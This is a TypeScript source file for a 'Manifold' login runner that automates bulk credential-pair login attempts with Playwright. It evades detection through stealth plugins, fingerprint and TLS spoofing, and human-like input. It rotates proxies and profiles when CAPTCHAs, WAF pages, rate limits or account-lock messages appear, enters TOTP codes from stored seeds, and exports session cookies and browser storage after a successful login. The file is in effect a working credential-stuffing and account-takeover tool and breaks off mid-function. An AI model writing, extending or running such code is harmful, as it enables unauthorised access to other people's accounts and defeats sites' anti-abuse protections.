// ── Manifold login runner ─────────────────────────────────────────────────────
//
// Core automation engine that drives credential-pair login attempts with:
//
//   • Domain-aware canvas / audio / font noise overrides
//   • Patched TLS stack (JA3/JA4 hardening via Chromium args)
//   • Full HumanBehaviorMiddleware integration (mouse, keyboard, scroll)
//   • Soft-signal detection → proxy + fingerprint rotation
//   • Per-attempt session state export (cookies + localStorage + IDB)
//   • Sequential and parallel concurrency modes
//   • TOTP / 2FA handling
//   • Consent banner auto-dismiss
//
// Usage:
//   const runner = new LoginRunner(profiles, proxies, wsClients);
//   await runner.start(run);

import { chromium } from "playwright-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import type { Browser, BrowserContext, Page } from "playwright";
import { applyAllEvasions, buildEvasionConfig } from "../evasions/index.js";
import { HumanBehaviorMiddleware } from "../human/index.js";
import type { Profile, Fingerprint, HumanBehavior, ProxyConfig } from "./types.js";
import type {
  LoginRun,
  LoginRunConfig,
  CredentialPair,
  CredentialStatus,
  AttemptResult,
  AttemptOutcome,
  RotationEvent,
  RotationTrigger,
  SessionState,
  CookieRecord,
  DomainProfile,
  LoginServerMsg,
} from "./login-types.js";
import {
  resolveDomainProfile,
  TLS_PATCH_ARGS,
  computeRunStats,
} from "./login-types.js";

// ─────────────────────────────────────────────────────────────────────────────
// Utilities
// ─────────────────────────────────────────────────────────────────────────────

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

function uuid(): string {
  return crypto.randomUUID();
}

function now(): string {
  return new Date().toISOString();
}

function seededJitter(base: number, pct: number, seed: number): number {
  // Deterministic ±pct% jitter seeded by credential seed
  const s = Math.sin(seed * 9301 + 49297) * 0.5 + 0.5;
  return base * (1 - pct + s * pct * 2);
}

/** Attempt to resolve a TOTP code from a seed (base32) using the Web Crypto API */
async function generateTotp(seed: string): Promise<string | null> {
  try {
    // Decode base32 seed
    const base32Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    const cleaned = seed.toUpperCase().replace(/[^A-Z2-7]/g, "");
    let bits = "";
    for (const ch of cleaned) {
      bits += base32Chars.indexOf(ch).toString(2).padStart(5, "0");
    }
    const bytes = new Uint8Array(
      Array.from({ length: Math.floor(bits.length / 8) }, (_, i) =>
        parseInt(bits.slice(i * 8, i * 8 + 8), 2)
      )
    );

    const keyMaterial = await crypto.subtle.importKey(
      "raw", bytes, { name: "HMAC", hash: "SHA-1" }, false, ["sign"]
    );

    const T = Math.floor(Date.now() / 1000 / 30);
    const tBuf = new ArrayBuffer(8);
    const tView = new DataView(tBuf);
    tView.setUint32(4, T, false);

    const sig = await crypto.subtle.sign("HMAC", keyMaterial, tBuf);
    const arr = new Uint8Array(sig);
    const offset = arr[19] & 0x0f;
    const code =
      (((arr[offset] & 0x7f) << 24) |
        ((arr[offset + 1] & 0xff) << 16) |
        ((arr[offset + 2] & 0xff) << 8) |
        (arr[offset + 3] & 0xff)) %
      1_000_000;

    return code.toString().padStart(6, "0");
  } catch {
    return null;
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Session state capture
// ─────────────────────────────────────────────────────────────────────────────

async function captureSessionState(
  page: Page,
  credentialId: string,
  profileId: string,
  context: BrowserContext
): Promise<SessionState> {
  const url = page.url();

  // ── Cookies ──────────────────────────────────────────────────────────────
  const rawCookies = await context.cookies();
  const cookies: CookieRecord[] = rawCookies.map((c) => ({
    name: c.name,
    value: c.value,
    domain: c.domain,
    path: c.path,
    expires: c.expires ?? -1,
    httpOnly: c.httpOnly,
    secure: c.secure,
    sameSite: (c.sameSite as CookieRecord["sameSite"]) ?? "",
  }));

  // ── localStorage + sessionStorage ────────────────────────────────────────
  const storageData = await page.evaluate(() => {
    const ls: Record<string, string> = {};
    const ss: Record<string, string> = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i)!;
        ls[k] = localStorage.getItem(k) ?? "";
      }
    } catch {}
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i)!;
        ss[k] = sessionStorage.getItem(k) ?? "";
      }
    } catch {}
    return { ls, ss };
  });

  // ── IndexedDB snapshot ────────────────────────────────────────────────────
  const idbSnapshot = await page.evaluate(async () => {
    const result: { db_name: string; version: number; stores: { name: string; records: unknown[] }[] }[] = [];
    try {
      const dbs = await indexedDB.databases?.();
      if (!dbs) return result;
      for (const dbInfo of dbs) {
        if (!dbInfo.name) continue;
        await new Promise<void>((resolve) => {
          const req = indexedDB.open(dbInfo.name!, dbInfo.version);
          req.onsuccess = () => {
            const db = req.result;
            const dbEntry = {
              db_name: dbInfo.name!,
              version: db.version,
              stores: [] as { name: string; records: unknown[] }[],
            };
            let pending = db.objectStoreNames.length;
            if (pending === 0) {
              result.push(dbEntry);
              db.close();
              resolve();
              return;
            }
            const tx = db.transaction(Array.from(db.objectStoreNames), "readonly");
            for (const storeName of Array.from(db.objectStoreNames)) {
              const store = tx.objectStore(storeName);
              const records: unknown[] = [];
              const cursorReq = store.openCursor();
              cursorReq.onsuccess = () => {
                const cursor = cursorReq.result;
                if (cursor) {
                  if (records.length < 500) records.push(cursor.value); // cap per store
                  cursor.continue();
                } else {
                  dbEntry.stores.push({ name: storeName, records });
                  pending--;
                  if (pending === 0) {
                    result.push(dbEntry);
                    db.close();
                    resolve();
                  }
                }
              };
              cursorReq.onerror = () => {
                pending--;
                if (pending === 0) {
                  result.push(dbEntry);
                  db.close();
                  resolve();
                }
              };
            }
            req.onerror = () => resolve();
          };
          req.onerror = () => resolve();
        });
      }
    } catch {}
    return result;
  });

  return {
    credential_id: credentialId,
    profile_id: profileId,
    captured_at: now(),
    url,
    cookies,
    local_storage: storageData.ls,
    session_storage: storageData.ss,
    indexed_db: idbSnapshot,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Session state restore
// ─────────────────────────────────────────────────────────────────────────────

async function restoreSessionState(
  page: Page,
  context: BrowserContext,
  state: SessionState
): Promise<void> {
  // Restore cookies
  if (state.cookies.length > 0) {
    await context.addCookies(
      state.cookies.map((c) => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        expires: c.expires,
        httpOnly: c.httpOnly,
        secure: c.secure,
        sameSite: c.sameSite || "None",
      }))
    );
  }

  // Restore localStorage
  if (Object.keys(state.local_storage).length > 0) {
    await page.evaluate((ls) => {
      try {
        for (const [k, v] of Object.entries(ls)) {
          localStorage.setItem(k, v);
        }
      } catch {}
    }, state.local_storage);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Soft signal detector
// ─────────────────────────────────────────────────────────────────────────────

async function detectSoftSignals(page: Page, config: LoginRunConfig): Promise<RotationTrigger[]> {
  const signals: RotationTrigger[] = [];

  try {
    const url = page.url();
    const content = await page.content().catch(() => "");
    const status = await page.evaluate(() => {
      return window.__manifold_last_status ?? 0;
    }).catch(() => 0);

    // HTTP 429 rate limit
    if (status === 429) {
      signals.push("rate_limit_429");
    }

    // CAPTCHA widget presence
    if (config.form.captcha_selector) {
      const captchaEl = await page.$(config.form.captcha_selector).catch(() => null);
      if (captchaEl) signals.push("captcha_detected");
    }

    // Generic CAPTCHA signals in content
    const captchaPatterns = [
      /g-recaptcha/i,
      /h-captcha/i,
      /arkose/i,
      /funcaptcha/i,
      /cf-challenge/i,
      /turnstile/i,
      /geetest/i,
    ];
    for (const pat of captchaPatterns) {
      if (pat.test(content)) {
        if (!signals.includes("captcha_detected")) {
          signals.push("captcha_detected");
        }
        break;
      }
    }

    // WAF challenge page
    const wafPatterns = [
      /checking your browser/i,
      /ddos protection/i,
      /please wait while we verify/i,
      /ray id:/i,
      /cf-ray/i,
      /just a moment/i,
    ];
    for (const pat of wafPatterns) {
      if (pat.test(content)) {
        signals.push("waf_challenge");
        break;
      }
    }

    // IP block signals
    const ipBlockPatterns = [
      /your (ip|address) (has been|is) (blocked|banned)/i,
      /access denied/i,
      /forbidden/i,
    ];
    for (const pat of ipBlockPatterns) {
      if (pat.test(content)) {
        signals.push("ip_block_signal");
        break;
      }
    }

    // Account locked signals
    const lockedPatterns = [
      /account (has been|is) (locked|suspended|banned|disabled)/i,
      /too many (failed|incorrect) (attempts|logins)/i,
      /temporarily (locked|disabled)/i,
    ];
    for (const pat of lockedPatterns) {
      if (pat.test(content)) {
        signals.push("account_locked_signal");
        break;
      }
    }

    // Rate limit in response body
    const rateLimitPatterns = [
      /too many requests/i,
      /rate limit(ed|ing)?/i,
      /please try again (later|in \d+)/i,
      /slow down/i,
    ];
    for (const pat of rateLimitPatterns) {
      if (pat.test(content)) {
        if (!signals.includes("rate_limit_429")) {
          signals.push("rate_limit_response");
        }
        break;
      }
    }

    // Redirect to verification
    if (
      /verify|confirm|checkpoint|security-check|challenge/i.test(url) &&
      !url.includes("login") &&
      !url.includes("signin")
    ) {
      signals.push("redirect_to_verify");
    }
  } catch {
    // Non-fatal — page may have navigated
  }

  return signals;
}

// ─────────────────────────────────────────────────────────────────────────────
// Apply domain-aware noise overrides to a fingerprint
// ─────────────────────────────────────────────────────────────────────────────

function applyDomainNoise(
  fp: Fingerprint,
  domainProfile: DomainProfile,
  humanCfg: HumanBehavior
): { fp: Fingerprint; human: HumanBehavior } {
  const newFp: Fingerprint = {
    ...fp,
    canvas_noise: Math.max(fp.canvas_noise, domainProfile.canvas_noise),
    webgl_noise:  Math.max(fp.webgl_noise,  domainProfile.webgl_noise),
    audio_noise:  Math.max(fp.audio_noise,  domainProfile.audio_noise),
    // Font subset — escalate only (full → reduced → paranoid)
    font_subset:
      domainProfile.font_subset === "paranoid" ? []            // use empty array = paranoid
      : domainProfile.font_subset === "reduced" && fp.font_subset.length > 20
        ? fp.font_subset.slice(0, 20)
        : fp.font_subset,
    // Hardware spoofing
    hardware_concurrency: domainProfile.spoof_hw_concurrency
      ? Math.min(fp.hardware_concurrency, 8)
      : fp.hardware_concurrency,
    device_memory: domainProfile.spoof_device_memory
      ? Math.min(fp.device_memory, 8)
      : fp.device_memory,
  };

  const newHuman: HumanBehavior = {
    ...humanCfg,
    mouse: {
      ...humanCfg.mouse,
      base_speed_px_per_sec:
        humanCfg.mouse.base_speed_px_per_sec * domainProfile.mouse_speed_factor,
    },
    typing: {
      ...humanCfg.typing,
      base_wpm: humanCfg.typing.base_wpm * domainProfile.typing_speed_factor,
    },
  };

  return { fp: newFp, human: newHuman };
}

// ─────────────────────────────────────────────────────────────────────────────
// Browser launch with optional TLS patching
// ─────────────────────────────────────────────────────────────────────────────

async function launchBrowser(
  profile: Profile,
  proxy: ProxyConfig | null,
  domainProfile: DomainProfile,
  patchTls: boolean
): Promise<{ browser: Browser; context: BrowserContext; page: Page }> {
  chromium.use(StealthPlugin());

  const fp = profile.fingerprint;

  const baseArgs = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-blink-features=AutomationControlled",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-site-isolation-trials",
    "--disable-dev-shm-usage",
    "--no-first-run",
    "--no-default-browser-check",
    "--disable-background-networking",
    "--disable-sync",
    "--disable-translate",
    "--disable-extensions",
    "--disable-hang-monitor",
    "--disable-prompt-on-repost",
    "--safebrowsing-disable-auto-update",
    "--password-store=basic",
    "--use-mock-keychain",
    `--lang=${fp.locale.replace("_", "-")}`,
    `--window-size=${fp.screen_width},${fp.screen_height}`,
  ];

  const tlsArgs = (patchTls && domainProfile.patch_tls) ? TLS_PATCH_ARGS : [];

  const browser = await chromium.launch({
    headless: false,
    args: [...baseArgs, ...tlsArgs],
    ignoreDefaultArgs: ["--enable-automation"],
  });

  const contextOptions: Parameters<Browser["newContext"]>[0] = {
    viewport:          { width: fp.viewport_width, height: fp.viewport_height },
    deviceScaleFactor: fp.pixel_ratio,
    userAgent:         fp.user_agent,
    locale:            fp.locale.replace("_", "-"),
    timezoneId:        fp.timezone,
    colorScheme:       "dark",
    acceptDownloads:   false,
    ignoreHTTPSErrors: false,
    extraHTTPHeaders:  { "Accept-Language": fp.accept_language },
  };

  if (proxy) {
    contextOptions.proxy = {
      server:   proxy.server,
      username: proxy.username,
      password: proxy.password,
    };
  }

  const context = await browser.newContext(contextOptions);

  // Block known tracking / analytics that inflate bot scores
  await context.route(
    /google-analytics\.com|doubleclick\.net|googlesyndication\.com|scorecardresearch\.com|quantserve\.com/,
    (route) => route.abort()
  );

  const page = await context.newPage();

  // Intercept responses to capture status codes for signal detection
  page.on("response", (res) => {
    if (res.status() === 429) {
      page.evaluate((s: number) => {
        window.__manifold_last_status = s;
      }, 429).catch(() => {});
    }
  });

  const evasionCfg = buildEvasionConfig(profile);
  await applyAllEvasions(page, evasionCfg);

  return { browser, context, page };
}

// ─────────────────────────────────────────────────────────────────────────────
// Single login attempt
// ─────────────────────────────────────────────────────────────────────────────

async function performLoginAttempt(
  page: Page,
  context: BrowserContext,
  human: HumanBehaviorMiddleware,
  credential: CredentialPair,
  config: LoginRunConfig,
  domainProfile: DomainProfile,
  credSeed: number,
): Promise<{
  outcome: AttemptOutcome;
  detail: string;
  finalUrl: string;
  signals: RotationTrigger[];
  sessionState: SessionState | undefined;
  screenshot: string | undefined;
}> {
  const form = config.form;
  const pageLoadTimeout = form.page_load_timeout_ms ?? 15_000;
  const postSubmitTimeout = form.post_submit_timeout_ms ?? 8_000;

  let signals: RotationTrigger[] = [];

  // ── 1. Navigate to login URL ────────────────────────────────────────────
  try {
    await page.goto(form.url, {
      waitUntil: "domcontentloaded",
      timeout: pageLoadTimeout,
    });
  } catch (e) {
    return {
      outcome: "timeout",
      detail: `Page load failed: ${String(e).slice(0, 200)}`,
      finalUrl: page.url(),
      signals: [],
      sessionState: undefined,
      screenshot: undefined,
    };
  }

  // Pre-load signal check
  signals = await detectSoftSignals(page, config);
  if (signals.includes("waf_challenge") || signals.includes("ip_block_signal")) {
    const ss = await page.screenshot().catch(() => undefined).then(b => b?.toString("base64"));
    return {
      outcome: "ip_blocked",
      detail: `Detected WAF/IP block before login: ${signals.join(", ")}`,
      finalUrl: page.url(),
      signals,
      sessionState: undefined,
      screenshot: ss,
    };
  }

  // ── 2. Human-like page appreciation pause ───────────────────────────────
  const loadPause = seededJitter(
    domainProfile.min_attempt_gap_ms * 0.4,
    0.3,
    credSeed
  );
  await sleep(Math.max(800, loadPause));

  // ── 3. Dismiss consent banner if present ────────────────────────────────
  if (form.consent_selector) {
    const consent = await page.$(form.consent_selector).catch(() => null);
    if (consent) {
      try {
        await human.click(form.consent_selector);
        await sleep(seededJitter(600, 0.3, credSeed + 1));
      } catch {
        // Non-fatal
      }
    }
  }

  // ── 4. Type username ─────────────────────────────────────────────────────
  try {
    await human.type(form.username_selector, credential.username);
  } catch (e) {
    return {
      outcome: "error",
      detail: `Username field not found (${form.username_selector}): ${String(e).slice(0, 200)}`,
      finalUrl: page.url(),
      signals,
      sessionState: undefined,
      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
    };
  }

  // Pause between username and password (domain-tuned)
  const interFieldPause = seededJitter(
    800 * (1 / domainProfile.typing_speed_factor),
    0.35,
    credSeed + 2
  );
  await sleep(interFieldPause);

  // ── 5. Type password ─────────────────────────────────────────────────────
  try {
    await human.type(form.password_selector, credential.password);
  } catch (e) {
    return {
      outcome: "error",
      detail: `Password field not found (${form.password_selector}): ${String(e).slice(0, 200)}`,
      finalUrl: page.url(),
      signals,
      sessionState: undefined,
      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
    };
  }

  // Pre-submit pause
  const preSubmitPause = seededJitter(
    600 * (1 / domainProfile.typing_speed_factor),
    0.4,
    credSeed + 3
  );
  await sleep(preSubmitPause);

  // ── 6. Submit ─────────────────────────────────────────────────────────────
  try {
    await human.click(form.submit_selector);
  } catch (e) {
    return {
      outcome: "error",
      detail: `Submit button not found (${form.submit_selector}): ${String(e).slice(0, 200)}`,
      finalUrl: page.url(),
      signals,
      sessionState: undefined,
      screenshot: await page.screenshot().catch(() => undefined).then(b => b?.toString("base64")),
    };
  }

  // ── 7. Wait for post-submit outcome ──────────────────────────────────────
  const waitStart = Date.now();
  let outcome: AttemptOutcome = "timeout";
  let detail = "";

  // Build a race between success, failure, captcha, and timeout
  try {
    const conditions: Promise<{ type: string; detail: string }>[] = [];

    // Success selector
    if (form.success_selector) {
      conditions.push(
        page.waitForSelector(form.success_selector, { timeout: postSubmitTimeout })
          .then(() => ({ type: "success", detail: "Success selector found" }))
      );
    }

    // Failure selector
    if (form.failure_selector) {
      conditions.push(
        page.waitForSelector(form.failure_selector, { timeout: postSubmitTimeout })
          .then(() => ({ type: "wrong_credentials", detail: "Failure selector found" }))
      );
    }

    // CAPTCHA selector
    if (form.captcha_selector) {
      conditions.push(
        page.waitForSelector(form.captcha_selector, { timeout: postSubmitTimeout })
          .then(() => ({ type: "captcha_block", detail: "CAPTCHA appeared post-submit" }))
      );
    }

    // TOTP selector (2FA)
    if (form.totp_selector) {
      conditions.push(
        page.waitForSelector(form.totp_selector, { timeout: postSubmitTimeout })
          .then(() => ({ type: "2fa_detected", detail: "2FA input appeared" }))
      );
    }

    // Fallback: navigation or URL change
    conditions.push(
      page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: postSubmitTimeout })
        .then(() => ({ type: "navigation", detail: `Navigated to ${page.url()}` }))
    );

    if (conditions.length === 0) {
      await sleep(postSubmitTimeout);
    } else {
      const result = await Promise.race(conditions).catch((e) => ({
        type: "timeout",
        detail: String(e).slice(0, 200),
      }));

      // ── Handle 2FA ────────────────────────────────────────────────────
      if (result.type === "2fa_detected" && form.totp_selector) {
        const totpCode = credential.extras.totp_seed
          ? await generateTotp(credential.extras.totp_seed)
          : credential.extras.totp_code ?? null;

        if (totpCode) {
          await sleep(seededJitter(1200, 0.3, credSeed + 10));
          try {
            await human.type(form.totp_selector, totpCode);
            await sleep(seededJitter(500, 0.3, credSeed + 11));

            // Re-look for submit or press Enter
            const totpSubmit = form.submit_selector;
            try {
              await human.click(totpSubmit);
            } catch {
              await page.keyboard.press("Enter");
            }

            // Wait again for success/failure
            if (form.success_selector) {
              await page.waitForSelector(form.success_selector, {
                timeout: postSubmitTimeout,
              }).catch(() => {});
            } else {
              await page.waitForNavigation({
                waitUntil: "domcontentloaded",
                timeout: postSubmitTimeout,
              }).catch(() => {});
            }

            outcome = "success";
            detail = "2FA completed successfully";
          } catch (e) {
            outcome = "2fa_required";
            detail = `2FA handling failed: ${String(e).slice(0, 200)}`;
          }
        } else {
          outcome = "2fa_required";
          detail = "2FA required but no TOTP seed or code provided in credential extras";
        }
      } else {
        // Map detected type to outcome
        switch (result.type) {
          case "success":
            outcome = "success";
            detail = result.detail;
            break;
          case "wrong_credentials":
            outcome = "wrong_credentials";
            detail = result.detail;
            break;
          case "captcha_block":
            outcome = "captcha_block";
            detail = result.detail;
            break;
          case "navigation": {
            // Determine success/failure from resulting URL + page content
            const finalUrl = page.url();
            const pageSignals = await detectSoftSignals(page, config);
            signals = [...signals, ...pageSignals];

            if (pageSignals.includes("account_locked_signal")) {
              outcome = "account_locked";
              detail = "Account locked signal after navigation";
            } else if (pageSignals.includes("ip_block_signal")) {
              outcome = "ip_blocked";
              detail = "IP blocked after navigation";
            } else if (pageSignals.includes("captcha_detected")) {
              outcome = "captcha_block";
              detail = "CAPTCHA detected after navigation";
            } else if (pageSignals.includes("redirect_to_verify")) {
              outcome = "2fa_required";
              detail = `Redirected to verification: ${finalUrl}`;
            } else {
              // Heuristic: if we left the login URL, assume success
              try {
                const loginHost = new URL(form.url).hostname;
                const finalHost = new URL(finalUrl).hostname;
                const loginPath = new URL(form.url).pathname;
                const finalPath = new URL(finalUrl).pathname;
                if (
                  finalHost === loginHost &&
                  finalPath === loginPath
                ) {
                  // Still on login page — likely failed
                  outcome = "wrong_credentials";
                  detail = "Still on login page after submit";
                } else {
                  outcome = "success";
                  detail = `Navigated away from login: ${finalUrl}`;
                }
              } catch {
                outcome = "success";
                detail = `Post-submit navigation: ${finalUrl}`;
              }
            }
            break;
          }
          case "timeout":
          default:
            outcome = "timeout";
            detail = result.detail || "Post-submit timeout";
        }
      }
    }
  } catch (e) {
    outcome = "error";
    detail = `Unexpected error: ${String(e).slice(0, 300)}`;
  }

  // ── 8. Post-outcome signal sweep ─────────────────────────────────────────
  const postSignals = await detectSoftSignals(page, config);
  for (const s of postSignals) {
    if (!signals.includes(s)) signals.push(s);
  }

  // Override outcome with stronger signal if we missed it
  if (outcome === "success" && postSignals.includes("account_locked_signal")) {
    outcome = "account_locked";
    detail = "Account locked signal detected post-success";
  }

  const finalUrl = page.url();

  // ── 9. Screenshot at resolution ──────────────────────────────────────────
  const screenshot = await page.screenshot().catch(() => undefined).then(b => b?.toString("base64"));

  // ── 10. Session export on success ────────────────────────────────────────
  let sessionState: SessionState | undefined;
  if (outcome === "success" && config.form.export_session_on_success) {
    try {
      sessionState = await captureSessionState(page, credential.id, "", context);
    } catch {
      // Non-fatal
    }
  }

  return { outcome, detail, finalUrl, signals, sessionState, screenshot };
}

// ─────────────────────────────────────────────────────────────────────────────
// LoginRunner class
// ─────────────────────────────────────────────────────────────────────────────

type BroadcastFn = (msg: LoginServerMsg) => void;

export class LoginRunner {
  private _run: LoginRun | null = null;
  private _paused = false;
  private _aborted = false;
  private _softSignalCounts: Map<string, number> = new Map();
  private _consecutiveFailures = 0;

  constructor(
    private readonly profiles: Profile[],
    private readonly proxies: Array<{ id: string; server: string; username?: string; password?: string; healthy: boolean }>,
    private readonly broadcast: BroadcastFn,
  ) {}

  // ── Public API ────────────────────────────────────────────────────────────

  async start(run: LoginRun): Promise<void> {
    this._run = run;
    this._paused = false;
    this._aborted = false;
    this._softSignalCounts.clear();
    this._consecutiveFailures = 0;

    run.status = "running";
    run.started_at = now();

    const domainProfile = run.config.domain_aware_noise
      ? resolveDomainProfile(run.config.form.url)
      : undefined;

    if (domainProfile) {
      run.config.domain_profile = domainProfile;
    }

    try {
      if (run.config.mode === "parallel" && run.config.concurrency > 1) {
        await this._runParallel(run, domainProfile);
      } else {
        await this._runSequential(run, domainProfile);
      }
    } catch (e) {
      this.broadcast({ type: "login_error", run_id: run.id, message: String(e) });
    }

    run.finished_at = now();
    run.status = this._aborted ? "aborted" : "completed";
    run.stats = computeRunStats(run.credentials, run.results, run.rotation_log);

    if (this._aborted) {
      this.broadcast({ type: "login_run_aborted", run_id: run.id });
    } else {
      this.broadcast({ type: "login_run_complete", run_id: run.id, stats: run.stats });
    }
  }

  pause(): void {
    this._paused = true;
    if (this._run) {
      this._run.status = "paused";
      this.broadcast({ type: "login_run_paused", run_id: this._run.id });
    }
  }

  resume(): void {
    this._paused = false;
    if (this._run) this._run.status = "running";
  }

  abort(): void {
    this._aborted = true;
    this._paused = false;
  }

  // ── Sequential runner ─────────────────────────────────────────────────────

  private async _runSequential(run: LoginRun, domainProfile?: DomainProfile): Promise<void> {
    const pending = run.credentials.filter(c =>
      c.status === "pending" || c.status === "error" || c.status === "soft_blocked"
    );

    for (const credential of pending) {
      if (this._aborted) break;

      // Respect pause
      while (this._paused && !this._aborted) {
        await sleep(250);
      }
      if (this._aborted) break;

      await this._attemptCredential(run, credential, domainProfile);

      // Domain-aware inter-attempt gap
      const gap = domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
      const jittered = seededJitter(gap, 0.25, credential.username.length + Date.now() % 1000);
      await sleep(jittered);
    }
  }

  // ── Parallel runner ───────────────────────────────────────────────────────

  private async _runParallel(run: LoginRun, domainProfile?: DomainProfile): Promise<void> {
    const concurrency = Math.max(1, Math.min(run.config.concurrency, 8));
    const pending = run.credentials.filter(c =>
      c.status === "pending" || c.status === "error" || c.status === "soft_blocked"
    );

    // Chunked parallel execution
    for (let i = 0; i < pending.length; i += concurrency) {
      if (this._aborted) break;
      while (this._paused && !this._aborted) await sleep(250);
      if (this._aborted) break;

      const batch = pending.slice(i, i + concurrency);
      await Promise.allSettled(
        batch.map(async (cred, idx) => {
          // Stagger launch within batch
          await sleep(run.config.launch_delay_ms * idx);
          if (!this._aborted) {
            await this._attemptCredential(run, cred, domainProfile);
          }
        })
      );

      const gap = domainProfile?.min_attempt_gap_ms ?? run.config.launch_delay_ms;
      await sleep(gap * 0.5);
    }
  }

  // ── Single credential attempt ─────────────────────────────────────────────

  private async _attemptCredential(
    run: LoginRun,
    credential: CredentialPair,
    domainProfile?: DomainProfile,
  ): Promise<void> {
    const config = run.config;
    const dp = domainProfile ?? resolveDomainProfile(config.form.url);

    // Pick profile from pool
    let profile = this._pickProfile(config.profile_pool, credential);
    if (!profile) {
      credential.status = "error";
      this._recordResult(run, credential, null, null, "error",
        "No available profile in pool", "", [], [], undefined, undefined);
      return;
    }

    // Rotate if config says so
    if (config.rotate_every_attempt && run.results.length > 0) {
      const rotated = await this._rotate(run, credential, profile, "manual");
      if (rotated) profile = rotated;
    }

    // Apply domain-aware noise overrides to profile copy
    const { fp: adjustedFp, human: adjustedHuman } = applyDomainNoise(
      profile.fingerprint,
      dp,
      profile.human
    );
    const adjustedProfile: Profile = {
      ...profile,
      fingerprint: adjustedFp,
      human: adjustedHuman,
    };

    // Resolve proxy
    const proxy = this._resolveProxy(profile);

    // Broadcast attempt start
    credential.status = "running";
    credential.profile_id = profile.id;
    credential.last_attempt = now();
    credential.attempts += 1;
    run.stats = computeRunStats(run.credentials, run.results, run.rotation_log);

    this.broadcast({
      type: "login_attempt_start",
      run_id: run.id,
      credential_id: credential.id,
      profile_id: profile.id,
    });

    const startedAt = now();
    const startMs = Date.now();
    const rotationEvents: RotationEvent[] = [];
    let browser: Browser | undefined;

    try {
      const launched = await launchBrowser(adjustedProfile, proxy, dp, config.patch_tls);
      browser = launched.browser;
      const { context, page } = launched;

      const human = new HumanBehaviorMiddleware(page, adjustedHuman, adjustedFp.seed);
      const credSeed = credential.username.split("").reduce((a, c) => a + c.charCodeAt(0), 0);

      const result = await performLoginAttempt(
        page, context, human, credential, config, dp, credSeed
      );

      // Record per-attempt signals for rotation threshold
      for (const sig of result.signals) {
        const count = (this._softSignalCounts.get(sig) ?? 0) + 1;
        this._softSignalCounts.set(sig, count);

        // Check if rotation threshold exceeded
        if (count >= config.soft_signal_threshold) {
          const rotated = await this._rotate(run, credential, profile, sig as RotationTrigger);
          if (rotated) {
            profile = rotated;
            const evt: RotationEvent = {
              ts: Date.now(),
              trigger: sig as RotationTrigger,
              credential_id: credential.id,
              old_profile_id: adjustedProfile.id,
              new_profile_id: rotated.id,
              old_proxy_id: proxy?.server ?? null,
              new_proxy_id: this._resolveProxy(rotated)?.server ?? null,
              details: `Soft signal threshold exceeded (${count}× ${sig})`,
            };
            rotationEvents.push(evt);
            run.rotation_log.push(evt);
            this.broadcast({ type: "login_rotation", run_id: run.id, event: evt });
            this._softSignalCounts.delete(sig);
          }
        }
      }

      // Track consecutive failures for rotation
      if (result.outcome === "wrong_credentials" || result.outcome === "timeout") {
        this._consecutiveFailures++;
        if (this._consecutiveFailures >= 3) {
          const rotated = await this._rotate(run, credential, profile, "consecutive_failures");
          if (rotated) {
            const evt: RotationEvent = {
              ts: Date.now(),
              trigger: "consecutive_failures",
              credential_id: credential.id,
              old_profile_id: profile.id,
              new_profile_id: rotated.id,
              old_proxy_id: proxy?.server ?? null,
              new_proxy_id: this._resolveProxy(rotated)?.server ?? null,
              details: `${this._consecutiveFailures} consecutive failures`,
            };
            rotationEvents.push(evt);
            run.rotation_log.push(evt);
            this.broadcast({ type: "login_rotation", run_id: run.id, event: evt });
          }
          this._consecutiveFailures = 0;
        }
      } else {
        this._consecutiveFailures = 0;
      }

      // Map outcome to credential status
      const credStatus = this._outcomeToCredStatus(result.outcome);
      credential.status = credStatus;

      // Fill session state with profile ID now that we have it
      if (result.sessionState) {
        result.sessionState.profile_id = profile.id;
      }

      this._recordResult(
        run, credential, profile, proxy,
        result.outcome, result.detail,
        result.finalUrl, result.signals,
        rotationEvents,
        result.sessionState,
        result.screenshot,
        startedAt, startMs,
      );

    } catch (e) {
      credential.status = "error";
      this._recordResult(run, credential, profile, proxy, "error",
        `Runner error: ${String(e).slice(0, 300)}`,
        "", [], rotationEvents, undefined, undefined, startedAt, startMs);
    } finally {
      if (browser) {
        await browser.close().catch(() => {});
      }
    }

    run.stats = computeRunStats(run.credentials, run.results, run.rotation_log);
  }

  // ── Rotation engine ───────────────────────────────────────────────────────

  private async _rotate(
    run: LoginRun,
    credential: CredentialPair,
    currentProfile: Profile,
    trigger: RotationTrigger,
  ): Promise<Profile | null> {
    // Find the next idle profile in the pool (skip current)
    const pool = run.config.profile_pool;
    const available = this.profiles.filter(p =>
      pool.includes(p.id) &&
      p.id !== currentProfile.id &&
      p.status === "idle"
    );

    if (available.length === 0) return null;

    // Pick least-recently-used from available
    const next = available.sort((a, b) => {
      const aT = a.last_used ?? a.created_at;
      const bT = b.last_used ?? b.created_at;
      return aT.localeCompare(bT);
    })[0];

    return next;
  }

  // ── Helpers ───────────────────────────────────────────────────────────────

  private _pickProfile(pool: string[], credential: CredentialPair): Profile | null {
    // Prefer previously used profile for this credential (continuity)
    if (credential.profile_id) {
      const prev = this.profiles.find(p => p.id === credential.profile_id && p.status === "idle");
      if (prev) return prev;
    }
    // Otherwise pick next idle from pool
    const idle = this.profiles.filter(p => pool.includes(p.id) && p.status === "idle");
    if (idle.length === 0) return null;
    return idle[Math.floor(Math.random() * idle.length)];
  }

  private _resolveProxy(profile: Profile): ProxyConfig | null {
    if (!profile.proxy_id) return null;
    const p = this.proxies.find(x => x.id === profile.proxy_id);
    if (!p || !p.healthy) return null;
    return { server: p.server, username: p.username, password: p.password };
  }

  private _outcomeToCredStatus(outcome: AttemptOutcome): CredentialStatus {
    switch (outcome) {
      case "success":              return "success";
      case "wrong_credentials":    return "failed";
      case "account_locked":       return "hard_blocked";
